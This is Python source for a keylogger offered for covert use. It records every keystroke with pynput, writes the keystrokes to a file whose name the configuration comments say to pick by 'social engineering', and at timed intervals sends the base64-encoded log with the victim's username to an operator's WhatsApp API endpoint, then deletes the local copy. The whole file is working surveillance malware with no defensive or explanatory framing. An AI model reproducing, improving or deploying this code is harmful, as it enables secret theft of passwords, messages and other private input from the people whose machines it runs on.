from pynput.keyboard import Key, Listener
import os
from datetime import datetime
import schedule
import requests
import base64
import sched,time
username = os.getlogin()
username = username.lower()
current_datetime = repr(datetime.now())
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
# <------You Can Change The Following Values------> #



file_name = ""       # <--- Use Social Engineering ---> #

api_link = ''               # <--- Past The Link Of Your WhatsApp API ----->  #

WhatsApp_number = ""       # <--- WhatsApp Number To Which Log send ----> #

Time = 1                    # <--- Time For wait ----> #


# <----If you have no programming experience don't mess up with below code----> #
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
#####################################################
Def_path = "" + file_name
def se():
    try:
        dec= open(file_name, "r")
        dec_data= dec.read().strip("''") 
        fins =  bytes(dec_data, 'ascii')
        result = base64.b64encode(fins)
        final = repr(result).strip("b''")
        data = ({
        "phone": "" +WhatsApp_number,
        "body": "data:@file/plain;base64," + final,
        "filename":username +": "+ file_name,
        })
        res = requests.post(api_link, json=data)
        dec.close()
        os.remove(file_name)
        schedule.clear(sec)
    except:
        pass
sec = schedule.every(Time).minutes.do(se)
def do():
     schedule.run_pending()
    

def send(key):
    file = open (Def_path,"a+")
    key_pressed = repr(key).strip("''")
    if key_pressed == "<Key.space: ' '>":
        key_pressed = " "
    elif key_pressed == "<Key.backspace: <8>>":
        try:
            i = 1
            file.seek(0,2)
            size = file.tell()
            file.truncate(size-i)
            key_pressed = ""
        except:
            i += 1
            key_pressed = ""
    elif key_pressed == "<Key.enter: <13>>":
        key_pressed = "\n"
    elif key_pressed == "<96>":
        key_pressed = "0"
    elif key_pressed == "<97>":
        key_pressed ="1"
    elif key_pressed == "<98>":
        key_pressed= "2"
    elif key_pressed == "<99>":
        key_pressed = "3"
    elif key_pressed == "<100>":
        key_pressed="4"
    elif key_pressed == "<101>":
        key_pressed="5"
    elif key_pressed == "<102>":
        key_pressed="6"
    elif key_pressed == "<103>":
        key_pressed="7"
    elif key_pressed == "<104>":
        key_pressed="8"
    elif key_pressed == "<105>":
        key_pressed="9"
    elif key_pressed == "<110>":
        key_pressed="."
    elif key_pressed == "<Key.shift: <160>>":
        key_pressed= "\nSpecial Key : Left Shift\n"
    elif  key_pressed == "<Key.shift_r: <161>>":
        key_pressed= "\nSpecial Key : Right Shift\n"
    elif key_pressed == "<Key.ctrl_l: <162>>":
        key_pressed= "\nSpecial Key : Left Ctrl\n"
    elif  key_pressed == "<Key.ctrl_r: <163>>":
        key_pressed= "\nSpecial Key : Right Ctrl\n"
    elif key_pressed == "<Key.cmd_r: <92>>":
        key_pressed=  "\nSpecial Key : Right Window \n"
    elif key_pressed == "<Key.cmd_r: <92>>":
        key_pressed=  "\nSpecial Key : Left Window \n"
    elif key_pressed == "<Key.alt_r: <165>>":
        key_pressed=  "\nSpecial Key : Right Alt \n"
    elif key_pressed == "<Key.alt_l: <164>>":
        key_pressed=  "\nSpecial Key : Left Alt \n"
    file.write(key_pressed)
    file.close()
    do()

with Listener(on_press=send) as listener:
    listener.join()
